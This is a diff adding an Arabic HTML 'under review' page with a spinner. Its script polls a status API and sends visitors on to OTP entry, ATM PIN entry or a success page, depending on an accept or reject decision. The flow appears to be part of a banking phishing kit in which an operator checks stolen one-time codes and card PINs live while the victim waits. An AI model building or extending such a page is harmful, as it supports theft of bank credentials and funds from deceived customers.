@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>جاري المراجعة</title>
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f5f7fb;
+      font-family: Arial, sans-serif;
+    }
+    .box {
+      background: transparent;
+      border-radius: 18px;
+      width: min(92vw, 480px);
+      box-shadow: none;
+      padding: 0;
+      text-align: center;
+    }
+    .spinner {
+      width: 56px;
+      height: 56px;
+      margin: 0 auto;
+      border: 5px solid rgba(242, 138, 42, 0.2);
+      border-top-color: #f28a2a;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner"></div>
+  </div>
+
+  <script>
+    (function(){
+      var params = new URLSearchParams(window.location.search);
+      var requestId = params.get('id');
+      var type = params.get('type') || 'otp';
+      if (!requestId) {
+        window.location.href = 'index.html';
+        return;
+      }
+
+      var interval = setInterval(function(){
+        fetch('/api/status/' + requestId)
+          .then(function(res){ return res.json(); })
+          .then(function(data){
+            if (!data || !data.status) return;
+            var status = String(data.status).trim().toLowerCase();
+            if (status === 'accept' || status === 'accepted' || status === 'approve' || status === 'approved' || status === 'otp') {
+              clearInterval(interval);
+              if (type === 'atm') {
+                window.location.href = 'success.html?id=' + requestId;
+              } else {
+                window.location.href = 'atm.html?id=' + requestId;
+              }
+              return;
+            }
+            if (status === 'reject' || status === 'rejected' || status === 'declined' || status === 'failed' || status === 'error') {
+              clearInterval(interval);
+              if (type === 'atm') {
+                var msg = 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
+                window.location.href = 'atm.html?error=atm&msg=' + encodeURIComponent(msg) + '&id=' + requestId;
+              } else {
+                var otpMsg = 'تم رفض رمز التحقق. يرجى التحقق من الرمز والمحاولة مرة أخرى.';
+                window.location.href = 'otp.html?error=otp&msg=' + encodeURIComponent(otpMsg) + '&id=' + requestId;
+              }
+            }
+          })
+          .catch(function(){});
+      }, 2000);
+    })();
+  </script>
+</body>
+</html>
